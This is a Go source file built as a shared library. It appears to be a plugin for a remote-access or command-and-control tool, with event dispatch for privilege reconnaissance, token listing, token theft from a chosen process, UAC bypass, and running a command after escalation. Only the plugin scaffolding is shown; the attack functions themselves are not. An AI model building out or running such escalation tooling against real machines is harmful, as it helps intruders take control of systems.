package main

import (
	"encoding/json"
	"sync"
)

var (
	sendMu sync.Mutex
	sendFn func(event string, payload []byte)
	host   map[string]interface{}
)

func setSend(fn func(event string, payload []byte)) {
	sendMu.Lock()
	sendFn = fn
	sendMu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	sendMu.Lock()
	fn := sendFn
	sendMu.Unlock()
	if fn == nil {
		return
	}
	var raw []byte
	switch v := payload.(type) {
	case []byte:
		raw = v
	case nil:
		raw = nil
	default:
		raw, _ = json.Marshal(v)
	}
	fn(event, raw)
}

func handleInit(hostJSON []byte) error {
	if len(hostJSON) > 0 {
		_ = json.Unmarshal(hostJSON, &host)
	}
	sendEvent("status", map[string]interface{}{"state": "loaded"})
	return nil
}

func handleUnload() {
	sendEvent("status", map[string]interface{}{"state": "unloaded"})
}

type Settings struct {
	// Which technique to attempt, or "auto" to try in order.
	Technique string `json:"technique"`

	// The command to run once elevated. If empty, the plugin reports the
	// escalation without executing anything.
	Command string `json:"command"`

	// Token stealing
	TargetProcess string `json:"targetProcess"`
	TargetPID     int    `json:"targetPid"`

	// UAC bypass
	BypassMethod string `json:"bypassMethod"`
}

func handleEvent(event string, payload []byte) error {
	preflight()
	var s Settings
	if len(payload) > 0 {
		_ = json.Unmarshal(payload, &s)
	}

	switch event {
	case "ping":
		sendEvent("pong", nil)
	case "recon":
		go privRecon()
	case "tokens":
		go listTokens()
	case "escalate":
		go escalate(s)
	case "steal_token":
		go stealToken(s)
	case "uac_bypass":
		go uacBypass(s)
	case "check_uac":
		go checkUAC()
	default:
		sendEvent("error", map[string]interface{}{"message": "unknown event: " + event})
	}
	return nil
}

// Required by cgo for -buildmode=c-shared.
func main() {}
